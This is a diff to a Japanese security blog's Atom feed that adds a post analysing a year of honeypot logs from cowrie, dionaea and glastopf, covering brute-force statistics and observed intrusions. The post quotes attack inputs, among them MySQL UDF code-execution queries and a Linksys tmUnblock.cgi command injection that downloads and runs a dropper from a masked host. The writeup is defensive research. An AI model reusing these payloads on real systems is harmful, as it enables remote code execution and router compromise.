@@ -4,7 +4,7 @@
   <subtitle><![CDATA[tail -f csirt.log]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="https://csirt.mrtc0.com/"/>
-  <updated>2016-01-21T16:48:38.400Z</updated>
+  <updated>2016-03-06T07:27:54.318Z</updated>
   <id>https://csirt.mrtc0.com/</id>
   
   <author>
@@ -15,9 +15,148 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)]]></title>
+    <link href="https://csirt.mrtc0.com/uncategorized/cilg6vltb00050lcmxfu2w7mx/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cilg6vltb00050lcmxfu2w7mx/</id>
+    <published>2016-03-05T14:00:49.000Z</published>
+    <updated>2016-03-06T07:27:54.318Z</updated>
+    <content type="html"><![CDATA[<p>2015年の1年間のハニーポットの記録です.<br>また, セキュリティ・キャンプ フォーラム2016で行われたセキュリティ・キャンプ アワード2016の発表内容です.  </p>
+<ul>
+<li><a href="/https://www.ipa.go.jp/jinzai/camp/2015/forum2016.html">セキュリティ・キャンプ フォーラム2016</a></li>
+<li><a href="http://www.security-camp.org/event/award2016.html" target="_blank" rel="external">セキュリティ・キャンプ アワード2016</a></li>
+</ul>
+<p>以下発表内容の一部をまとめたものです.  </p>
+<p>また, ログはGitHubで公開しているので興味がある方はご覧ください.  </p>
+<ul>
+<li><a href="https://github.com/mrt-k/honeylog2015" target="_blank" rel="external">mrt-k/honeylog2015 GitHub</a></li>
+</ul>
+<p>2016年の記録も一ヶ月ごとに更新予定です.  </p>
+<ul>
+<li><a href="https://github.com/mrt-k/honeylog2016" target="_blank" rel="external">mrt-k/honeylog2016 GitHub</a></li>
+</ul>
+<h3 id="u6982_u8981"><a href="#u6982_u8981" class="headerlink" title="概要"></a>概要</h3><p>動かしたハニーポットはcowrie, dionaea, glastopfの3つです.  </p>
+<ul>
+<li>cowrie - <a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="external">https://github.com/micheloosterhof/cowrie</a></li>
+<li>dionaea - <a href="https://github.com/rep/dionaea" target="_blank" rel="external">https://github.com/rep/dionaea</a></li>
+<li>Glastopf - <a href="http://glastopf.org/" target="_blank" rel="external">http://glastopf.org/</a></li>
+</ul>
+<p>dionaeaは接続時のバナーやMySQLのコマンド結果により検知が可能なので, 一部修正したものを使用しました.<br>修正箇所は以下の部分です。  </p>
+<ul>
+<li>FTPのバナー情報</li>
+<li>MSSQLのpre-login TDS package</li>
+<li>SMBのOemDomainNameとServerName</li>
+<li>MySQLのコマンド結果</li>
+</ul>
+<p>検知回避に関しては以下の記事がよくまとまっています.<br><a href="http://sonickun.hatenablog.com/entry/2015/01/30/193142" target="_blank" rel="external">Dionaeaを改変してNmapによる検出を回避する</a></p>
+<p>MySQLはあらかじめ決められたコマンド以外には”Learn SQL!”と返すため, その箇所を変更しました.  </p>
+<p><a href="https://github.com/mrt-k/dionaea/commit/b4fd7f9ab081dec7c51c441d964cfa013af2a7b8" target="_blank" rel="external">https://github.com/mrt-k/dionaea/commit/b4fd7f9ab081dec7c51c441d964cfa013af2a7b8</a></p>
+<h5 id="u5916_u304B_u3089_u898B_u305F_u72B6_u614B"><a href="#u5916_u304B_u3089_u898B_u305F_u72B6_u614B" class="headerlink" title="外から見た状態"></a>外から見た状態</h5><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE</span><br><span class="line"><span class="number">21</span>/tcp   <span class="built_in">open</span>     <span class="keyword">ftp</span></span><br><span class="line"><span class="number">22</span>/tcp   <span class="built_in">open</span>     ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>     <span class="keyword">http</span></span><br><span class="line"><span class="number">135</span>/tcp  <span class="built_in">open</span>     msrpc</span><br><span class="line"><span class="number">139</span>/tcp  <span class="built_in">open</span>     netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp  <span class="built_in">open</span>     microsoft-ds</span><br><span class="line"><span class="number">1433</span>/tcp <span class="built_in">open</span>     ms-sql-s</span><br><span class="line"><span class="number">3306</span>/tcp <span class="built_in">open</span>     mysql</span><br></pre></td></tr></table></figure>
+<h3 id="cowrie_u3067_u306E_u8A18_u9332"><a href="#cowrie_u3067_u306E_u8A18_u9332" class="headerlink" title="cowrieでの記録"></a>cowrieでの記録</h3><p>SSHハニーポットであるcowrieで取得できた記録のまとめです.  </p>
+<h4 id="u56FD_u5225_u30A2_u30AF_u30BB_u30B9_u6570"><a href="#u56FD_u5225_u30A2_u30AF_u30BB_u30B9_u6570" class="headerlink" title="国別アクセス数"></a>国別アクセス数</h4><p><img src="https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/session_count_graph.png" alt="top_10_country"></p>
+<p>1年間で101098回のアクセス試行がありました.<br>中国からのアクセスが28006件と3~4割を占めており, 次いでアメリカ, ロシアとなっています.  </p>
+<p><img src="https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/session_count_graph.png" alt="worldmap"></p>
+<p>全部で94カ国からアクセスがありました.</p>
+<p>月によりますが, 週末やクリスマスなどの時期はアクセスが増加する傾向もありました.<br>中には1ヶ月以上認証を試みる者もいました.  </p>
+<h4 id="Top_10_usernames"><a href="#Top_10_usernames" class="headerlink" title="Top 10 usernames"></a>Top 10 usernames</h4><p>試行回数上位10件のユーザー名です.</p>
+<p><img src="https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/username_rank.png" alt="top_10_username"></p>
+<h4 id="Top_10_passwords"><a href="#Top_10_passwords" class="headerlink" title="Top 10 passwords"></a>Top 10 passwords</h4><p>試行回数上位10件のパスワードです.</p>
+<p><img src="https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/password_rank.png" alt="top_10_password"></p>
+<h4 id="Top_10_usernames_and_passwords"><a href="#Top_10_usernames_and_passwords" class="headerlink" title="Top 10 usernames and passwords"></a>Top 10 usernames and passwords</h4><p>試行回数上位10件のユーザー名とパスワードの組み合わせです.</p>
+<p><img src="https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/username-password.png" alt="top_10_username_password"></p>
+<p>存在しそうなアカウントやいわゆる「弱いパスワード」を狙っています.<br>ubntなど, ルーターのデフォルトアカウントを狙ったものが目立ちます.  </p>
+<h4 id="Top_10_base_words"><a href="#Top_10_base_words" class="headerlink" title="Top 10 base words"></a>Top 10 base words</h4><p>使用されたパスワードの元となっている単語のランキングです.</p>
+<ol>
+<li>admin</li>
+<li>root</li>
+<li>password</li>
+<li>test</li>
+<li>oracle</li>
+<li>ubnt</li>
+<li>user</li>
+<li>ホスト名</li>
+<li>qwerty</li>
+<li>VPSの会社名</li>
+</ol>
+<p>これらの単語に数字や記号を付与したもの(admin123のようなもの)が多く使用されています.<br>このランキングからホスト名やVPSを運営している会社名をベースとしたパスワード(sakura123のようなもの)を試行に使っていることもわかります.</p>
+<h4 id="u30D1_u30B9_u30EF_u30FC_u30C9_u306E_u9577_u3055"><a href="#u30D1_u30B9_u30EF_u30FC_u30C9_u306E_u9577_u3055" class="headerlink" title="パスワードの長さ"></a>パスワードの長さ</h4><p>使用されたパスワードの長さです.</p>
+<p><img src="https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/password_length_rank.png" alt="pasword_length_rank"></p>
+<p>5, 6, 8文字が多いのは, 一般的に推奨されている(いた)長さからだと思います.  </p>
+<h4 id="u305D_u306E_u4ED6"><a href="#u305D_u306E_u4ED6" class="headerlink" title="その他"></a>その他</h4><p>使用されたパスワードのうち, アルファベット小文字のみで構成されているものが50%以上を占めていることや, 末尾が数字となっているものは123や000のような連番となっているケースが多いことが分かりました.</p>
+<p>また, RaspberryPiで使用されるRaspbianのデフォルトのユーザー名とパスワードの組み合わせである pi:raspberry も多く見受けられました.  </p>
+<h4 id="u4FB5_u5165_u5F8C_u306E_u30B3_u30DE_u30F3_u30C9"><a href="#u4FB5_u5165_u5F8C_u306E_u30B3_u30DE_u30F3_u30C9" class="headerlink" title="侵入後のコマンド"></a>侵入後のコマンド</h4><p>ほとんどがスクリプトによって自動化されているもので, 数撃てば当たるようにネットワーク内をスキャンしているようです.<br>流れとしてはuname, w, psといったコマンドを実行した後, ファイアウォールの停止, マルウェアのダウンロード, 実行, ログ消去という流れです.  </p>
+<p>マルウェアのダウンロード先は/tmp/以下に隠しファイルや隠しディレクトリを使用するケースが多いです.<br>また, 自身のSSH公開鍵をauthorized_keysに追加する手法もありました.  </p>
+<h4 id="u4F59_u8AC7"><a href="#u4F59_u8AC7" class="headerlink" title="余談"></a>余談</h4><p>Pastbinなどのようなサイトにホスト名, ユーザー名, パスワードを公開するとすぐにアクセスが来たりします.  </p>
+<h3 id="Dionaea_u3067_u306E_u8A18_u9332"><a href="#Dionaea_u3067_u306E_u8A18_u9332" class="headerlink" title="Dionaeaでの記録"></a>Dionaeaでの記録</h3><p>MySQLから任意のコードを実行する攻撃がよく目立ちます.  </p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT <span class="function"><span class="title">unhex</span><span class="params">(<span class="string">'23707261676D…'</span>)</span></span> INTO DUMPFILE <span class="string">'C:/windows/system32/…/nullevt.mof'</span></span><br></pre></td></tr></table></figure>
+<p>16進数のバイナリ列をunhexしてファイルに書き出す手法です.<br>これを利用した攻撃として以下のようなものがあります.  </p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT unhex(<span class="emphasis">'7F454C46010...'</span>) INTO DUMPFILE <span class="emphasis">'/usr/lib/mysql/plugin/xiaoji.so'</span></span><br><span class="line">mysql&gt; CREATE FUNCTION sys<span class="emphasis">_eval RETURNS string SONAME 'xiaoji.so'</span><br><span class="line">mysql&gt; SELECT sys_</span>eval("whoami;");</span><br><span class="line"><span class="code">+---------------------+</span></span><br><span class="line"><span class="header">| exec('whoami')      |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| root                |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.05 sec)</span><br></pre></td></tr></table></figure>
+<p>MySQLにおけるUDF(ユーザー定義関数)を利用します.<br>コンパイル済みの共有ライブラリを %plugin_dir% に書き出し, 実行する攻撃です.  </p>
+<p>しかし, MySQL5.1.30から %plugin_dir% がデフォルトでは存在しないため, 書き出せなくなりました.<br>ですが, NTFS上では$INDEX_ALLOCATIONを使用するとファイルの代わりにディレクトリを作成することができます.<br>その性質を利用した攻撃も観測しました.  </p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="constant">C</span>:\<span class="constant">Users</span>\user01&gt;dir /w <span class="string">"C:\mysql-5.1.30-winx64\lib\plugin"</span></span><br><span class="line"> <span class="constant">C</span>:\mysql-<span class="number">5.1</span>.<span class="number">30</span>-winx64\<span class="class"><span class="keyword">lib</span> のディレクトリ</span></span><br><span class="line"> ファイルが見つかりません</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="string">'x'</span> into dumpfile <span class="string">'C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'</span>;</span><br><span class="line"></span><br><span class="line"><span class="constant">C</span>:\<span class="constant">Users</span>\user01&gt;dir /w <span class="string">"C:\mysql-5.1.30-winx64\lib\plugin"</span></span><br><span class="line">  <span class="constant">C</span>:\mysql-<span class="number">5.1</span>.<span class="number">30</span>-winx64\<span class="class"><span class="keyword">lib</span>\<span class="title">plugin</span> のディレクトリ</span></span><br><span class="line">  [.]  [..]</span><br><span class="line">                 <span class="number">0</span> 個のファイル                   <span class="number">0</span> バイト</span><br><span class="line">                 <span class="number">2</span> 個のディレクトリ  <span class="number">22</span>,<span class="number">038</span>,<span class="number">724</span>,<span class="number">608</span> バイトの空き領域</span><br></pre></td></tr></table></figure>
+<p>5.1.30ではpluginという名前のディレクトリは存在しません.<br>しかし, $INDEX_ALLOCATIONを付与するとファイルの代わりにディレクトリが作成することが可能なことがわかります.  </p>
+<p>その他にも以下のようなコマンドを観測しました.  </p>
+<ul>
+<li>関数を作成するための設定を変更</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> log_bin_trust_routine_creators=<span class="number">1</span>;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>OS情報の取得</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'%compile_os%'</span>;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>ユーザーの作成</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'user'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'pass'</span>;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>権限の変更</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">GRANT</span> <span class="keyword">ALTER</span>, …</span></span><br></pre></td></tr></table></figure>
+<h3 id="Web_u30B5_u30FC_u30D3_u30B9_u3078_u306E_u653B_u6483"><a href="#Web_u30B5_u30FC_u30D3_u30B9_u3078_u306E_u653B_u6483" class="headerlink" title="Webサービスへの攻撃"></a>Webサービスへの攻撃</h3><p>Webサーバーを運用している人は分かるかと思いますが, 各種管理画面や設定情報へは頻繁にアクセスがあります.  </p>
+<ul>
+<li>/manager/html - tomcat</li>
+<li>/wp/login.php - WordPress</li>
+<li>/CFIDE/administrator/ - Adobe ColdFusion</li>
+<li>/phpmyadmin/ - PHP My Admin</li>
+<li>/epgrec/ - epgrec</li>
+<li>robots.txt</li>
+<li>.htaccess</li>
+</ul>
+<p>狙われた脆弱性としては以下のようなものが多くあります.  </p>
+<ul>
+<li>CVE-2012-1823</li>
+<li>Shell Shock</li>
+<li>Apache Struts関係の脆弱性</li>
+<li>JBoss</li>
+</ul>
+<p>これらの脆弱性に共通することとして, 任意のコードが実行可能であるということです.<br>脆弱性を利用してどのように攻撃されるのか, Linksys社のルーターを標的とした攻撃を見てみます.  </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="request">POST <span class="string">/tmUnblock.cgi</span> HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="stata">submit_button=&amp;change_action=&amp;action=&amp;commit=&amp;ttcp_num=2&amp;ttcp_size=2&amp;ttcp_ip=-<span class="literal">h</span></span><br><span class="line">`<span class="keyword">cd</span> /tmp;</span><br><span class="line">wget -O scaC.<span class="keyword">sh</span> hxxp:<span class="comment">//x.x.x.x/ttp/ttp.sh;</span></span><br><span class="line">chmod +x scaC.<span class="keyword">sh</span>;</span><br><span class="line">./scaC.<span class="keyword">sh</span>`&amp;StartEPI=1``</span></span><br></pre></td></tr></table></figure>
+<p>tmUnblock.cgiには任意のコマンドを実行可能な脆弱性があります.<br>ttp.shという名前のドロッパーによって, MIPSなマルウェアが実行されます.  </p>
+<figure class="highlight vhdl"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">file</span> .*</span><br><span class="line">.nttpd: ELF <span class="number">32</span>-<span class="typename">bit</span> LSB  executable, MIPS, MIPS-I version <span class="number">1</span> (SYSV), dynamically linked (uses <span class="keyword">shared</span> libs), stripped</span><br><span class="line">.sca:   ELF <span class="number">32</span>-<span class="typename">bit</span> LSB  executable, MIPS, MIPS-I version <span class="number">1</span> (SYSV), dynamically linked (uses <span class="keyword">shared</span> libs), stripped</span><br><span class="line">.sox:   ELF <span class="number">32</span>-<span class="typename">bit</span> LSB  executable, MIPS, MIPS-I version <span class="number">1</span> (SYSV), dynamically linked (uses <span class="keyword">shared</span> libs), stripped</span><br></pre></td></tr></table></figure>
+<p>マルウェアにはDDoSを発生させるためにiptablesでUDP周りの設定を変更する処理などが含まれています.  </p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ strings .nttpd| grep INPUT   </span><br><span class="line">INPUT -p udp --dport %u -j ACCEPT</span><br><span class="line">INPUT -p udp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">INPUT -p tcp -m multiport --dport <span class="number">80</span>,<span class="number">8080</span> -j DROP</span><br><span class="line">INPUT -s <span class="number">46.148</span><span class="number">.18</span><span class="number">.0</span>/<span class="number">24</span> -j ACCEPT</span><br><span class="line">INPUT -s <span class="number">185.56</span><span class="number">.30</span><span class="number">.0</span>/<span class="number">24</span> -j ACCEPT</span><br><span class="line">INPUT -s <span class="number">217.79</span><span class="number">.182</span><span class="number">.0</span>/<span class="number">24</span> -j ACCEPT</span><br><span class="line">INPUT -s <span class="number">85.114</span><span class="number">.135</span><span class="number">.0</span>/<span class="number">24</span> -j ACCEPT</span><br><span class="line">INPUT -s <span class="number">95.213</span><span class="number">.143</span><span class="number">.0</span>/<span class="number">24</span> -j ACCEPT</span><br><span class="line">INPUT -s <span class="number">185.53</span><span class="number">.8</span><span class="number">.0</span>/<span class="number">24</span> -j ACCEPT</span><br></pre></td></tr></table></figure>
+<h3 id="u6240_u611F"><a href="#u6240_u611F" class="headerlink" title="所感"></a>所感</h3><p>デフォルトの設定や甘い設定を狙った攻撃/スキャンは毎日のように行われています.<br>また, ルーターを狙っていると思われる攻撃も多く, マルウェアもその環境で動作するようなARMやMIPSなどのものが多く利用されています.<br>ルーターに脆弱性が見つかってもファームウェアが自動更新されないものがあったり, そもそもルーターの更新が必要だと知らない人もいるのではないでしょうか.<br>IoTの普及が進むにつれて組み込み機器向けの攻撃も増加するのではと思います.  </p>
+<p>最近の攻撃はDrive-by downloadが主流であること, そのためにクライアント型ハニーポットが利用されてきたがマルウェアが取れない、などの理由からハニーポットに関する研究も2010年ごろからオワコン化している印象があります.<br>ですが, ダークネットにハニーポットを設置し, 観測することでマルウェアの活動傾向を把握できたりしますし, 何より攻撃者が身近にいること, どのような手法を使っているのか攻撃者を知ることができます.<br>そこからどう対策をとればいいのかを考え, セキュリティ意識の改善にも繋がるのではと思います.  </p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>2015年の1年間のハニーポットの記録です.<br>また, セキュリティ・キャンプ フォーラム2016で行われたセキュリティ・キャンプ アワード2016の発表内容です.  </p>
+<ul>
+<li><a href="/https://www.ipa.go.jp/jinz]]>
+    </summary>
+    
+      <category term="cowrie" scheme="https://csirt.mrtc0.com/tags/cowrie/"/>
+    
+      <category term="dionaea" scheme="https://csirt.mrtc0.com/tags/dionaea/"/>
+    
+      <category term="glastopf" scheme="https://csirt.mrtc0.com/tags/glastopf/"/>
+    
+      <category term="honeypot" scheme="https://csirt.mrtc0.com/tags/honeypot/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[.htaccessで悪質なサイトへ誘導する手法]]></title>
-    <link href="https://csirt.mrtc0.com/uncategorized/cijoht7f90000kqcmqlh6hd31/"/>
-    <id>https://csirt.mrtc0.com/uncategorized/cijoht7f90000kqcmqlh6hd31/</id>
+    <link href="https://csirt.mrtc0.com/uncategorized/cilg6vlsp00000lcmv9nh1znz/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cilg6vlsp00000lcmv9nh1znz/</id>
     <published>2016-01-21T14:45:06.000Z</published>
     <updated>2016-01-21T16:48:38.400Z</updated>
     <content type="html"><![CDATA[<p>Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  </p>
